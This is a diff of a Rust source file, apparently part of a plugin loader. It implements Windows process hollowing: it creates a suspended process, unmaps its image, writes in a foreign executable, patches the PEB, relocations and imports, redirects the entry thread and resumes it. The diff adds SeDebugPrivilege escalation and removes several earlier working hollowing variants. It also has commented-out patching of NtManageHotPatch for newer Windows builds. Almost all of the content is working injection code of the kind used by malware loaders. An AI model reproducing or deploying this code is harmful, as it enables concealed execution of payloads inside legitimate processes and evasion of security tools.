@@ -1,10 +1,9 @@
-use windows::{core::BOOL, Wdk::System::Threading::PROCESSINFOCLASS, Win32::{Foundation::*, System::{Diagnostics::Debug::*, LibraryLoader::*, Memory::*, Threading::*}}};
+use windows::{core::BOOL, Wdk::System::Threading::PROCESSINFOCLASS, Win32::{Foundation::*, Security::{AdjustTokenPrivileges, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY}, System::{Diagnostics::Debug::*, LibraryLoader::*, Memory::*, ProcessStatus::{EnumProcessModulesEx, GetModuleBaseNameA, ENUM_PROCESS_MODULES_EX_FLAGS}, Threading::*}}};
 use windows::Wdk::System::{Memory::NtUnmapViewOfSection, Threading::NtQueryInformationProcess};
 use windows::Win32::System::SystemServices::IMAGE_DOS_HEADER;
-use windows_strings::{PSTR, PCSTR};
+use windows_strings::{s, PCSTR, PSTR};
 use std::ffi::c_void;
 use crate::PluginApp;
-
 
 impl PluginApp {
     /// A corrected and robust implementation of process hollowing for EXEs.
@@ -16,6 +15,25 @@ impl PluginApp {
         let mut process_info = PROCESS_INFORMATION::default();
         let mut command_line = format!("{}\0", target_exe);
         unsafe {
+            // Enable SeDebugPrivilege
+            let mut token: HANDLE = HANDLE(std::ptr::null_mut());
+            if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token).is_ok() {
+                let mut luid = LUID::default();
+                if LookupPrivilegeValueA(PCSTR(std::ptr::null()), s!("SeDebugPrivilege"), &mut luid).is_ok() {
+                    let mut tp = TOKEN_PRIVILEGES {
+                        PrivilegeCount: 1,
+                        Privileges: [LUID_AND_ATTRIBUTES {
+                            Luid: luid,
+                            Attributes: SE_PRIVILEGE_ENABLED,
+                        }],
+                    };
+                    AdjustTokenPrivileges(token, false, Some(&mut tp), 0, None, None)?;
+                }
+                CloseHandle(token)?;
+            } else {
+                log::warn!("Failed to open process token for SeDebugPrivilege");
+            }
+
             CreateProcessA(
                 None,
                 Some(PSTR(command_line.as_mut_ptr())),
@@ -36,9 +54,12 @@ impl PluginApp {
 
         let mut context = CONTEXT::default();
         context.ContextFlags = CONTEXT_ALL_AMD64;
-        unsafe { GetThreadContext(h_thread, &mut context) }?;
+        if let Err(e) = unsafe { GetThreadContext(h_thread, &mut context) } {
+            log::error!("GetThreadContext failed: {:?}", unsafe { windows::Win32::Foundation::GetLastError().to_hresult().message() });
+            return Err(anyhow::anyhow!("GetThreadContext failed: {:?}", e));
+        }
 
-        // Get the original RSP and RBP values (captured at suspension)
+        // Log original RSP and RBP
         let original_rsp = context.Rsp;
         let original_rbp = context.Rbp;
         log::info!("Original RSP: 0x{:X}\nOriginal RBP: 0x{:X}", original_rsp, original_rbp);
@@ -54,11 +75,9 @@ impl PluginApp {
                 std::ptr::null_mut(),
             )
         };
-        
         if !status.is_ok() {
             return Err(anyhow::anyhow!("NtQueryInformationProcess failed with status: {:?}", status));
         }
-
         log::info!("Remote PEB at: {:?}", pbi.PebBaseAddress);
 
         let image_base_addr_ptr = (pbi.PebBaseAddress as usize + 0x10) as *mut c_void;
@@ -90,7 +109,14 @@ impl PluginApp {
         let entry_rva = opt.standard_fields.address_of_entry_point;
         let size_of_image = opt.windows_fields.size_of_image as usize;
         let size_of_headers = opt.windows_fields.size_of_headers as usize;
-        log::info!("Source PE parsed: Size=0x{:X}, EntryRVA=0x{:X}, PreferredBase=0x{:X}", size_of_image, entry_rva, image_base);
+        log::info!(
+            "Source PE parsed: Size=0x{:X}, EntryRVA=0x{:X}, PreferredBase=0x{:X}, Imports={:?}, TLS={:?}",
+            size_of_image,
+            entry_rva,
+            image_base,
+            opt.data_directories.get_import_table(),
+            opt.data_directories.get_tls_table()
+        );
 
         // 5. Allocate memory for the new image with PAGE_EXECUTE_READWRITE
         let new_base = unsafe {
@@ -107,18 +133,22 @@ impl PluginApp {
         }
         log::info!("New image allocated at: 0x{:X}", new_base);
 
-        // 7. Write PE headers
-        unsafe { WriteProcessMemory(
-            h_process,
-            new_base as *mut c_void,
-            pe_data.as_ptr() as *const c_void,
-            size_of_headers,
-            None,
-        )?};
+        // 6. Write PE headers
+        unsafe {
+            WriteProcessMemory(
+                h_process,
+                new_base as *mut c_void,
+                pe_data.as_ptr() as *const c_void,
+                size_of_headers,
+                None,
+            )?
+        };
         log::info!("Headers written at: 0x{:X}", new_base);
 
-        // 8. Write sections
-        use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, PAGE_NOACCESS};
+        // 7. Write sections
+        use windows::Win32::System::Memory::{
+            VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, PAGE_NOACCESS,
+        };
         for section in pe.sections.iter() {
             let dest = (new_base + section.virtual_address as usize) as *mut c_void;
             let src_offset = section.pointer_to_raw_data as usize;
@@ -131,15 +161,7 @@ impl PluginApp {
                 continue;
             }
             let src = pe_data.as_ptr().wrapping_add(src_offset) as *const c_void;
-            let write_section = unsafe {
-                WriteProcessMemory(
-                    h_process,
-                    dest,
-                    src,
-                    raw_size,
-                    None,
-                )
-            };
+            let write_section = unsafe { WriteProcessMemory(h_process, dest, src, raw_size, None) };
             if !write_section.is_ok() {
                 log::warn!("WriteProcessMemory failed for section {}", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()));
             } else {
@@ -147,750 +169,7 @@ impl PluginApp {
             }
         }
 
-        // 9. Update PEB image base
-        let new_base_bytes = new_base.to_le_bytes();
-        unsafe { WriteProcessMemory(
-            h_process,
-            image_base_addr_ptr,
-            new_base_bytes.as_ptr() as *const c_void,
-            new_base_bytes.len(),
-            None,
-        )?};
-        log::info!("Remote PEB image base updated to 0x{:X}", new_base);
-        
-        // 10. Apply relocations if needed
-        if new_base != image_base {
-            log::info!("Applying relocations (delta: 0x{:X})...", new_base.wrapping_sub(image_base));
-            if let Err(e) = Self::apply_relocations(pe_data, h_process, new_base, image_base) {
-                log::error!("Relocations failed: {:?}", e);
-                return Err(e);
-            }
-
-            // 10b. Patch TLS directory fields after relocation
-            let tls_dir_opt = opt.data_directories.get_tls_table();
-            if let Some(tls_dir) = tls_dir_opt {
-                if tls_dir.virtual_address != 0 && tls_dir.size >= 24 { // Size for 64-bit TLS Directory
-                    log::info!("Patching TLS directory after relocation");
-                    let tls_va = tls_dir.virtual_address as usize;
-                    let tls_rva_offset = crate::pe_helpers::rva_to_offset(pe_data, tls_va).unwrap_or(0);
-
-                    if tls_rva_offset > 0 {
-                        #[repr(C)]
-                        #[derive(Copy, Clone, Debug)]
-                        struct ImageTlsDirectory64 {
-                            start_address_of_raw_data: u64,
-                            end_address_of_raw_data: u64,
-                            address_of_index: u64,
-                            address_of_callbacks: u64,
-                            size_of_zero_fill: u32,
-                            characteristics: u32,
-                        }
-                        
-                        if tls_rva_offset + std::mem::size_of::<ImageTlsDirectory64>() <= pe_data.len() {
-                            let tls_dir_struct: &ImageTlsDirectory64 = unsafe { &*(pe_data.as_ptr().add(tls_rva_offset) as *const ImageTlsDirectory64) };
-                            let mut patched_tls = *tls_dir_struct;
-                            let delta = new_base.wrapping_sub(image_base);
-                            
-                            let patch_field = |field: u64| {
-                                if field != 0 {
-                                    field.wrapping_add(delta as u64)
-                                } else {
-                                    0
-                                }
-                            };
-
-                            patched_tls.start_address_of_raw_data = patch_field(tls_dir_struct.start_address_of_raw_data);
-                            patched_tls.end_address_of_raw_data = patch_field(tls_dir_struct.end_address_of_raw_data);
-                            patched_tls.address_of_index = patch_field(tls_dir_struct.address_of_index);
-                            patched_tls.address_of_callbacks = patch_field(tls_dir_struct.address_of_callbacks);
-
-                            let remote_tls_addr = (new_base + tls_va) as *mut c_void;
-                            if unsafe { WriteProcessMemory(h_process, remote_tls_addr, &patched_tls as *const _ as *const c_void, std::mem::size_of::<ImageTlsDirectory64>(), None) }.is_ok() {
-                                log::info!("TLS directory patched successfully in remote process.");
-                            } else {
-                                log::warn!("Failed to write patched TLS directory to remote process.");
-                            }
-                        } else {
-                            log::warn!("TLS directory offset out of bounds, skipping patch.");
-                        }
-                    }
-                }
-            }
-        }
-        
-        // 11. Resolve imports
-        log::info!("Resolving imports...");
-        if let Err(e) = Self::resolve_imports(pe_data, h_process, new_base as *mut c_void) {
-            log::error!("Import resolution failed: {:?}", e);
-            return Err(e);
-        }
-
-        // 12. Set all sections and PE header to PAGE_EXECUTE_READWRITE before resuming the thread
-        log::info!("Setting all sections and PE header to PAGE_EXECUTE_READWRITE before resume...");
-        for section in pe.sections.iter() {
-            let dest = (new_base + section.virtual_address as usize) as *mut c_void;
-            let size = std::cmp::max(section.virtual_size, section.size_of_raw_data) as usize;
-            if size > 0 {
-                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-                if let Err(e) = unsafe { VirtualProtectEx(h_process, dest, size, PAGE_EXECUTE_READWRITE, &mut old_protect) } {
-                    log::warn!("Failed to set PAGE_EXECUTE_READWRITE for section {}: {:?}", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()), e);
-                }
-            }
-        }
-        // Set PE header to PAGE_EXECUTE_READWRITE
-        let mut old_protect_header = PAGE_PROTECTION_FLAGS(0);
-        if let Err(e) = unsafe { VirtualProtectEx(h_process, new_base as *mut c_void, size_of_headers, PAGE_EXECUTE_READWRITE, &mut old_protect_header) } {
-            log::warn!("Failed to set PAGE_EXECUTE_READWRITE for PE header: {:?}", e);
-        }
-        unsafe { FlushInstructionCache(h_process, None, 0)? };
-        log::info!("Instruction cache flushed before resume.");
-
-        // if let Err(e) = Self::patch_nt_manage_hotpatch64(h_process) {
-        //     log::error!("patch_nt_manage_hotpatch64 failed: {e}");
-        //     let err = unsafe { windows::Win32::Foundation::GetLastError() };
-        //     log::error!("Win32 Error: {}", err.to_hresult().message());
-        // } else {
-        //     log::info!("NtManageHotPatch64 patched successfully");
-        // }
-
-        // // 13. Set thread context to new entry point
-        // let mut context = CONTEXT::default();
-        // context.ContextFlags = CONTEXT_ALL_AMD64;
-        // unsafe { GetThreadContext(h_thread, &mut context)? };
-        // #[cfg(target_arch = "x86_64")]
-        // {
-        //     context.Rip = new_base as u64 + entry_rva as u64;
-        // }
-        // #[cfg(target_arch = "x86")]
-        // {
-        //     context.Eip = (new_base as u32).wrapping_add(entry_rva);
-        // }
-        // log::info!("Setting thread entry point to 0x{:X}", new_base as u64 + entry_rva as u64);
-        // let set_ctx = unsafe { SetThreadContext(h_thread, &context) };
-        // if let Err(e) = set_ctx {
-        //     let err = unsafe { windows::Win32::Foundation::GetLastError() };
-        //     log::error!("Win32 Error: {}", err.to_hresult().message());
-        //     return Err(anyhow::anyhow!("SetThreadContext failed: {e:?}"));
-        // }
-
-        // 14. Resume thread
-        log::info!("Resuming main thread...");
-        let resume_count = unsafe { ResumeThread(h_thread) };
-        if resume_count == u32::MAX {
-            let err = unsafe { windows::Win32::Foundation::GetLastError() };
-            log::error!("Win32 Error: {}", err.to_hresult().message());
-            return Err(anyhow::anyhow!("ResumeThread failed"));
-        }
-        log::info!("ResumeThread returned: {}", resume_count);
-
-        // 15. After a short delay, set final protections
-        std::thread::sleep(std::time::Duration::from_millis(200));
-        log::info!("Setting final section protections after delay...");
-        for section in pe.sections.iter() {
-            let dest = (new_base + section.virtual_address as usize) as *mut c_void;
-            let size = std::cmp::max(section.virtual_size, section.size_of_raw_data) as usize;
-            let characteristics = section.characteristics;
-            if size > 0 {
-                let protection = if characteristics & 0x20000000 != 0 { // EXECUTE
-                    if characteristics & 0x40000000 != 0 { // READ
-                        if characteristics & 0x80000000 != 0 { PAGE_EXECUTE_READWRITE } else { PAGE_EXECUTE_READ }
-                    } else {
-                        PAGE_EXECUTE_READ // Default to Execute+Read
-                    }
-                } else if characteristics & 0x80000000 != 0 { // WRITE
-                    PAGE_READWRITE
-                } else if characteristics & 0x40000000 != 0 { // READ
-                    PAGE_READONLY
-                } else {
-                    PAGE_NOACCESS
-                };
-                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-                if let Err(e) = unsafe { VirtualProtectEx(h_process, dest, size, protection, &mut old_protect) } {
-                    log::warn!("Failed to set final protection for section {}: {:?}", String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()), e);
-                }
-            }
-        }
-        // Set PE header to READONLY
-        let mut old_protect_header = PAGE_PROTECTION_FLAGS(0);
-        if let Err(e) = unsafe { VirtualProtectEx(h_process, new_base as *mut c_void, size_of_headers, PAGE_READONLY, &mut old_protect_header) } {
-            log::warn!("Failed to set final protection for PE header: {:?}", e);
-        }
-        unsafe { FlushInstructionCache(h_process, None, 0)? };
-        log::info!("Instruction cache flushed after final protections.");
-
-        log::info!("Hollowing complete. New process PID: {}", process_info.dwProcessId);
-
-        // Clean up handles
-        unsafe { CloseHandle(h_thread) }?;
-        unsafe { CloseHandle(h_process) }?;
-
-        Ok(process_info.dwProcessId)
-    }
-
-    /// A corrected and robust implementation of process hollowing for EXEs.
-    pub unsafe fn hollow_process_with_exe3(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
-        log::info!("[hollow/exe] Starting process hollowing for target: {}", target_exe);
-
-        // 1. Create the target process in a suspended state
-        let startup_info = STARTUPINFOA::default();
-        let mut process_info = PROCESS_INFORMATION::default();
-        let mut command_line = format!("{}\0", target_exe);
-        unsafe {
-            CreateProcessA(
-                None,
-                Some(PSTR(command_line.as_mut_ptr())),
-                None,
-                None,
-                false,
-                CREATE_SUSPENDED,
-                None,
-                None,
-                &startup_info,
-                &mut process_info,
-            )?
-        };
-        log::info!("[hollow/exe] Suspended process created. PID: {}", process_info.dwProcessId);
-
-        let h_process = process_info.hProcess;
-        let h_thread = process_info.hThread;
-
-        // 2. Get the PEB address and image base address
-        let mut pbi = PROCESS_BASIC_INFORMATION::default();
-        let status = unsafe {
-            NtQueryInformationProcess(
-                h_process,
-                windows::Wdk::System::Threading::PROCESSINFOCLASS(0),
-                &mut pbi as *mut _ as *mut c_void,
-                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-                std::ptr::null_mut(),
-            )
-        };
-        if !status.is_ok() {
-            return Err(anyhow::anyhow!("NtQueryInformationProcess failed with status: {:?}", status));
-        }
-        log::info!("[hollow/exe] Remote PEB at: {:?}", pbi.PebBaseAddress);
-
-        let image_base_addr_ptr = (pbi.PebBaseAddress as usize + 0x10) as *mut c_void;
-        let mut remote_image_base_buf = [0u8; std::mem::size_of::<usize>()];
-        unsafe {
-            ReadProcessMemory(
-                h_process,
-                image_base_addr_ptr,
-                remote_image_base_buf.as_mut_ptr() as *mut c_void,
-                remote_image_base_buf.len(),
-                None,
-            )?
-        };
-        let remote_image_base = usize::from_le_bytes(remote_image_base_buf);
-        log::info!("[hollow/exe] Original image base: 0x{:X}", remote_image_base);
-
-        // 3. Unmap the original executable
-        let status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
-        if status.is_err() {
-            log::info!("[hollow/exe][warn] NtUnmapViewOfSection returned non-success status: {:?}. This might be okay.", status);
-        } else {
-            log::info!("[hollow/exe] NtUnmapViewOfSection succeeded.");
-        }
-
-        // 4. Parse PE headers
-        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
-        let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
-        let optional_header = unsafe { &mut (*nt_headers_ptr).OptionalHeader };
-        let file_header = unsafe { &(*nt_headers_ptr).FileHeader };
-        let image_base = optional_header.ImageBase as usize;
-        let entry_rva = optional_header.AddressOfEntryPoint;
-        let size_of_image = optional_header.SizeOfImage as usize;
-        let size_of_headers = optional_header.SizeOfHeaders as usize;
-        log::info!("[hollow/exe] Source PE parsed: Size=0x{:X}, EntryRVA=0x{:X}, PreferredBase=0x{:X}", size_of_image, entry_rva, image_base);
-
-        // 5. Allocate memory for the new image
-        let new_base = unsafe {
-            VirtualAllocEx(
-                h_process,
-                None,
-                size_of_image,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_EXECUTE_READWRITE,
-            )
-        } as usize;
-        if new_base == 0 {
-            return Err(anyhow::anyhow!("VirtualAllocEx failed: {}", std::io::Error::last_os_error()));
-        }
-        log::info!("[hollow/exe] New image allocated at: 0x{:X}", new_base);
-
-        // 6. Patch image base in local headers before writing
-        optional_header.ImageBase = new_base as u64;
-
-        // 7. Write PE headers
-        unsafe { WriteProcessMemory(
-            h_process,
-            new_base as *mut c_void,
-            pe_data.as_ptr() as *const c_void,
-            size_of_headers,
-            None,
-        )?};
-
-        log::info!("[hollow/exe] Headers written at: 0x{:X}", new_base);
-
-        // 8. Write sections
-        let sections_ptr = (nt_headers_ptr as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
-        let sections = unsafe { std::slice::from_raw_parts(sections_ptr, file_header.NumberOfSections as usize) };
-        for section in sections {
-            let dest = (new_base + section.VirtualAddress as usize) as *mut c_void;
-            let src_offset = section.PointerToRawData as usize;
-            let raw_size = section.SizeOfRawData as usize;
-            if raw_size == 0 {
-                continue;
-            }
-            if src_offset + raw_size > pe_data.len() {
-                log::info!("[hollow/exe][warn] Section {} out of bounds, skipping", String::from_utf8_lossy(&section.Name));
-                continue;
-            }
-            let src = pe_data.as_ptr().wrapping_add(src_offset) as *const c_void;
-            let write_section = unsafe {
-                WriteProcessMemory(
-                    h_process,
-                    dest,
-                    src,
-                    raw_size,
-                    None,
-                )
-            };
-            if !write_section.is_ok() {
-                log::info!("[hollow/exe][warn] WriteProcessMemory failed for section {}", String::from_utf8_lossy(&section.Name));
-            } else {
-                log::info!("[hollow/exe] Section {} written at: 0x{:X}", String::from_utf8_lossy(&section.Name), dest as usize);
-            }
-        }
-
-        // 9. Update PEB image base
-        let new_base_bytes = new_base.to_le_bytes();
-
-        unsafe { WriteProcessMemory(
-            h_process,
-            image_base_addr_ptr,
-            new_base_bytes.as_ptr() as *const c_void,
-            new_base_bytes.len(),
-            None,
-        )?};
-
-        log::info!("[hollow/exe] Remote PEB image base updated to 0x{:X}", new_base);
-
-        // 10. Apply relocations if needed
-        if new_base != image_base {
-            let delta = new_base.wrapping_sub(image_base);
-            log::info!("[hollow/exe] Applying relocations (delta: 0x{:X})...", delta);
-            Self::apply_relocations(pe_data, h_process, new_base, image_base)?;
-        } else {
-            log::info!("[hollow/exe] No relocations needed.");
-        }
-
-        // 11. Resolve imports
-        log::info!("[hollow/exe] Resolving imports...");
-        Self::resolve_imports(pe_data, h_process, new_base as *mut c_void)?;
-
-        // 12. Set memory protection for the whole image (for reliability)
-        let mut old_protect  = PAGE_PROTECTION_FLAGS(0);
-        unsafe { VirtualProtectEx(
-            h_process,
-            new_base as *mut c_void,
-            size_of_image,
-            PAGE_EXECUTE_READWRITE,
-            &mut old_protect,
-        )?};
-
-        // 12b. Patch NtManageHotPatch in remote process for Win11 24H2+ compatibility
-        // if let Err(e) = Self::patch_nt_manage_hotpatch64(h_process) {
-        //     log::info!("[hollow/exe][warn] patch_nt_manage_hotpatch64 failed: {e}");
-        // } else {
-        //     log::info!("[hollow/exe] NtManageHotPatch64 patched successfully");
-        // }
-
-        // 13. Set thread context to new entry point
-        let mut context = CONTEXT::default();
-        context.ContextFlags = CONTEXT_ALL_AMD64;
-        unsafe { GetThreadContext(h_thread, &mut context)? };
-
-        #[cfg(target_arch = "x86_64")]
-        {
-            context.Rip = new_base as u64 + entry_rva as u64;
-        }
-        #[cfg(target_arch = "x86")]
-        {
-            context.Eip = (new_base as u32).wrapping_add(entry_rva);
-        }
-        log::info!("[hollow/exe] Setting thread entry point to 0x{:X}", new_base as u64 + entry_rva as u64);
-        let set_ctx = unsafe { SetThreadContext(h_thread, &context) };
-        if let Err(e) = set_ctx {
-            return Err(anyhow::anyhow!("SetThreadContext failed: {e:?}"));
-        }
-
-        // 14. Resume thread
-        log::info!("[hollow/exe] Resuming main thread...");
-        let resume_count = unsafe { ResumeThread(h_thread) };
-        if resume_count == u32::MAX {
-            return Err(anyhow::anyhow!("ResumeThread failed"));
-        }
-        log::info!("[hollow/exe] ResumeThread returned: {}", resume_count);
-
-        log::info!("[hollow/exe] Hollowing complete. New process PID: {}", process_info.dwProcessId);
-
-        // Clean up handles
-        unsafe { CloseHandle(h_thread) }?;
-        unsafe { CloseHandle(h_process) }?;
-
-        Ok(process_info.dwProcessId)
-    }
-
-    // WORKING FOR SOME EXE'S, DO NOT REMOVE
-    pub unsafe fn hollow_process_with_exe_original(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
-        log::info!("[hollow/exe] Starting hollow_process_with_exe for target_exe: {}", target_exe);
-        // 1. Create suspended process
-        let mut startup_info = STARTUPINFOA::default();
-        let mut process_info = PROCESS_INFORMATION::default();
-        let mut command_line = format!("{}\0", target_exe);
-        log::info!("[hollow/exe] Creating suspended process...");
-        unsafe {
-            CreateProcessA(
-                None,
-                Some(PSTR(command_line.as_mut_ptr())),
-                None,
-                None,
-                BOOL(0).into(),
-                CREATE_SUSPENDED,
-                None,
-                None,
-                &mut startup_info,
-                &mut process_info,
-            ).map_err(|e| anyhow::anyhow!("CreateProcessA failed: {}", e))?;
-        }
-        log::info!("[hollow/exe] Suspended process created. PID: {}", process_info.dwProcessId);
-
-        let h_process = process_info.hProcess;
-        let h_thread = process_info.hThread;
-
-        // 2. Read remote PEB to get image base
-        let mut peb_addr_buf = [0u8; 8];
-        let peb_base_addr = {
-            use windows::Win32::System::Threading::PROCESS_BASIC_INFORMATION;
-            let mut pbi = PROCESS_BASIC_INFORMATION::default();
-            let mut ret_len = 0u32;
-            log::info!("[hollow/exe] Querying remote PEB...");
-            let status = unsafe { NtQueryInformationProcess(
-                h_process,
-                PROCESSINFOCLASS(0),
-                &mut pbi as *mut _ as *mut c_void,
-                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-                &mut ret_len,
-            ) };
-            if status != windows::Win32::Foundation::NTSTATUS(0) {
-                log::error!("[hollow/exe][error] NtQueryInformationProcess failed: status=0x{:X}", status.0);
-                return Err(anyhow::anyhow!("NtQueryInformationProcess failed: status=0x{:X}", status.0));
-            }
-            log::info!("[hollow/exe] PebBaseAddress: 0x{:X}", pbi.PebBaseAddress as usize);
-            pbi.PebBaseAddress as usize
-        };
-        let image_base_addr_ptr = (peb_base_addr + 0x10) as *mut c_void;
-        log::info!("[hollow/exe] Reading remote image base from PEB...");
-        unsafe {
-            if let Err(e) = ReadProcessMemory(h_process, image_base_addr_ptr, peb_addr_buf.as_mut_ptr() as _, 8, None) {
-                log::error!("[hollow/exe][error] ReadProcessMemory (PEB image base) failed: {e}");
-                return Err(anyhow::anyhow!("ReadProcessMemory (PEB image base) failed: {e}"));
-            }
-        }
-        let remote_image_base = usize::from_le_bytes(peb_addr_buf);
-        log::info!("[hollow/exe] Remote image base: 0x{:X}", remote_image_base);
-
-        // 3. Unmap original image
-        log::info!("[hollow/exe] Unmapping original image...");
-        unsafe {
-            let status = NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void));
-            log::info!("[hollow/exe] NtUnmapViewOfSection status: 0x{:X}", status.0);
-        }
-
-        // 4. Parse new EXE headers
-        if pe_data.len() < 0x100 {
-            log::error!("[hollow/exe][error] PE buffer too small");
-            return Err(anyhow::anyhow!("PE buffer too small"));
-        }
-        let e_lfanew = u32::from_le_bytes(pe_data[0x3C..0x40].try_into().unwrap()) as usize;
-        let nt_headers = &pe_data[e_lfanew..];
-        let size_of_image = u32::from_le_bytes(nt_headers[0x50..0x54].try_into().unwrap()) as usize;
-        let entry_rva = u32::from_le_bytes(nt_headers[0x18 + 0x10..0x18 + 0x14].try_into().unwrap()) as usize;
-        let image_base = u64::from_le_bytes(nt_headers[0x18..0x20].try_into().unwrap()) as usize;
-        log::info!("[hollow/exe] Parsed EXE: size_of_image=0x{:X}, entry_rva=0x{:X}, image_base=0x{:X}", size_of_image, entry_rva, image_base);
-
-        // 5. Allocate memory for new image
-        log::info!("[hollow/exe] Allocating memory for new image at 0x{:X}...", image_base);
-        let alloc = unsafe {
-            VirtualAllocEx(
-                h_process,
-                Some(image_base as *mut _),
-                size_of_image,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_EXECUTE_READWRITE,
-            )
-        };
-        let new_base = if alloc.is_null() {
-            log::info!("[hollow/exe][warn] Preferred base allocation failed, trying fallback...");
-            let err = unsafe { windows::Win32::Foundation::GetLastError() };
-            log::error!("Win32 Error: {}", err.to_hresult().message());
-            unsafe {
-                VirtualAllocEx(
-                    h_process,
-                    None,
-                    size_of_image,
-                    MEM_COMMIT | MEM_RESERVE,
-                    PAGE_EXECUTE_READWRITE,
-                ) as usize
-            }
-        } else {
-            alloc as usize
-        };
-        log::info!("[hollow/exe] New image base: 0x{:X}", new_base);
-        if new_base == 0 {
-            log::error!("[hollow/exe][error] VirtualAllocEx for new image failed");
-            let err = unsafe { windows::Win32::Foundation::GetLastError() };
-            log::error!("Win32 Error: {}", err.to_hresult().message());
-            return Err(anyhow::anyhow!("VirtualAllocEx for new image failed"));
-        }
-
-        // 6. Write headers
-        let size_of_headers = u32::from_le_bytes(nt_headers[0x54..0x58].try_into().unwrap()) as usize;
-        log::info!("[hollow/exe] Writing headers (size: 0x{:X})...", size_of_headers);
-        unsafe {
-            if let Err(e) = WriteProcessMemory(h_process, new_base as *mut c_void, pe_data.as_ptr() as _, size_of_headers, None) {
-                log::error!("[hollow/exe][error] WriteProcessMemory (headers) failed: {e}");
-                let err = windows::Win32::Foundation::GetLastError();
-                log::error!("Win32 Error: {}", err.to_hresult().message());
-                return Err(anyhow::anyhow!("WriteProcessMemory (headers) failed: {e}"));
-            }
-        }
-
-        // 7. Write sections
-        let num_sections = u16::from_le_bytes(nt_headers[6..8].try_into().unwrap()) as usize;
-        let section_table = e_lfanew + 0x18 + u16::from_le_bytes(nt_headers[20..22].try_into().unwrap()) as usize;
-        log::info!("[hollow/exe] Writing {} sections...", num_sections);
-        for i in 0..num_sections {
-            let sec_off = section_table + i * 40;
-            let virt_addr = u32::from_le_bytes(pe_data[sec_off + 12..sec_off + 16].try_into().unwrap()) as usize;
-            let raw_size = u32::from_le_bytes(pe_data[sec_off + 16..sec_off + 20].try_into().unwrap()) as usize;
-            let raw_ptr = u32::from_le_bytes(pe_data[sec_off + 20..sec_off + 24].try_into().unwrap()) as usize;
-            log::info!("[hollow/exe] Section {}: VA=0x{:X}, raw_size=0x{:X}, raw_ptr=0x{:X}", i, virt_addr, raw_size, raw_ptr);
-            if raw_size == 0 || raw_ptr == 0 { continue; }
-            unsafe {
-                if let Err(e) = WriteProcessMemory(
-                    h_process,
-                    (new_base + virt_addr) as *mut c_void,
-                    pe_data[raw_ptr..raw_ptr + raw_size].as_ptr() as _,
-                    raw_size,
-                    None,
-                ) {
-                    log::error!("[hollow/exe][error] WriteProcessMemory (section {}) failed: {e}", i);
-                    let err = windows::Win32::Foundation::GetLastError();
-                    log::error!("Win32 Error: {}", err.to_hresult().message());
-                    return Err(anyhow::anyhow!("WriteProcessMemory (section {}) failed: {e}", i));
-                }
-            }
-        }
-
-        // 8. Update remote PEB image base if needed
-        if new_base != remote_image_base {
-            let new_base_bytes = new_base.to_le_bytes();
-            log::info!("[hollow/exe] Updating remote PEB image base to 0x{:X}...", new_base);
-            unsafe {
-                if let Err(e) = WriteProcessMemory(h_process, image_base_addr_ptr, new_base_bytes.as_ptr() as *const c_void, 8, None) {
-                    log::error!("[hollow/exe][error] WriteProcessMemory (PEB image base) failed: {e}");
-                    let err = windows::Win32::Foundation::GetLastError();
-                    log::error!("Win32 Error: {}", err.to_hresult().message());
-                    return Err(anyhow::anyhow!("WriteProcessMemory (PEB image base) failed: {e}"));
-                }
-            }
-        }
-
-        // 9. Set thread context to new entry point
-        let mut context = CONTEXT::default();
-        #[cfg(target_arch = "x86_64")]
-        {
-            context.ContextFlags = CONTEXT_ALL_AMD64;
-        }
-        #[cfg(target_arch = "x86")]
-        {
-            context.ContextFlags = CONTEXT_ALL_X86;
-        }
-        log::info!("[hollow/exe] Getting thread context...");
-        unsafe {
-            if let Err(e) = GetThreadContext(h_thread, &mut context) {
-                log::error!("[hollow/exe][error] GetThreadContext failed: {e}");
-                let err = windows::Win32::Foundation::GetLastError();
-                log::error!("Win32 Error: {}", err.to_hresult().message());
-                return Err(anyhow::anyhow!("GetThreadContext failed: {e}"));
-            }
-            context.Rip = (new_base + entry_rva) as u64;
-            log::info!("[hollow/exe] Setting thread RIP to 0x{:X} (entry point)...", (new_base + entry_rva));
-            if let Err(e) = SetThreadContext(h_thread, &context) {
-                log::error!("[hollow/exe][error] SetThreadContext failed: {e}");
-                return Err(anyhow::anyhow!("SetThreadContext failed: {e}"));
-            }
-        }
-
-        // 10. Resume main thread
-        log::info!("[hollow/exe] Resuming main thread...");
-        unsafe {
-            let resume_count = ResumeThread(h_thread);
-            log::info!("[hollow/exe] ResumeThread returned: {}", resume_count);
-        }
-
-        log::info!("[hollow/exe] Hollowing complete. New process PID: {}", process_info.dwProcessId);
-        Ok(process_info.dwProcessId)
-    }
-
-
-    pub unsafe fn hollow_process_with_exe(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
-        log::info!("Starting process hollowing for target: {}", target_exe);
-
-        // 1. Create the target process in a suspended state
-        let startup_info = STARTUPINFOA::default();
-        let mut process_info = PROCESS_INFORMATION::default();
-        let mut command_line = format!("{}\0", target_exe);
